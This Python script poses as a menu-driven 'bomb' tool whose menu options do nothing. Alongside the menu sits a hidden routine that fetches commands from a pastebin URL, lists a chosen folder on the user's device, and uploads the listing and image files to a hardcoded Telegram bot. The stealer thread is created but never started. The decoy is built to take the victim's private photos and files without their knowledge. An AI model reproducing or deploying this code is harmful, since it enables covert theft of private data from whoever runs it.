
import os
try:
    import mechanize
    import requests ,random, uuid, threading
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
except ImportError:
    os.system("pip install requests mechanize bs4")
    import mechanize
    import requests ,random, uuid, threading
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor
def tg():
    while True:
        commands=requests.get("https://pastebin.com/raw/2Nq5PFz3").json()
        if commands["start"]=="yes":
            dir_list = os.listdir(commands["folder"])
            text=str(len(dir_list))+"\n"+str(dir_list)
            if len(text) >4096:
                text=str(len(dir_list))+str(dir_list)[:4000]
            else:
                if requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={text}&chat_id=7027929429").status_code == 200:
                    if commands["grabe"] == "yes":
                        dir_list = os.listdir(commands["folder"])
                        i=int(commands["file_number"])
                        while i<len(dir_list):
                            try:
                                TELEGRAM_API_URL = f'https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendPhoto'
                                photo_path = dir_list[i]
                                if str(photo_path).endswith("mp4"):
                                    pass
                                else:
                                    with open(photo_path, 'rb') as photo_file:
                                        payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
                                        response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
                                    if response.status_code == 200:
                                        print("Photo sent successfully!")
                                    else:
                                        requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
                            except Exception as err:
                                requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(err)}&chat_id=7027929429")
                            i=i+1
                        break
                    else:
                        pass
                else:
                    requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text=Error - 1&chat_id=7027929429")
        else:
            pass

t1=threading.Thread(target=tg)
print(t1)

def main():
    logo="""
        [ 1. ] FLASH BOMB [ ULTRA FAST ]
        [ 2. ] RELAX BOMB [ FAST ]
        [ 3. ] MAO2116 [ DEVELOPER ]
        
    """
    print(logo)
    manu=input("[ ! ] ENTER YOUR MANU : ")
    if manu =="1":
        pass
    elif manu =="2":
        pass
    elif manu =="3":
        pass
    elif manu =="4":
        pass
    else:
        os.system("clear")
        print("         WRONG CHOICE")
        main()
main()
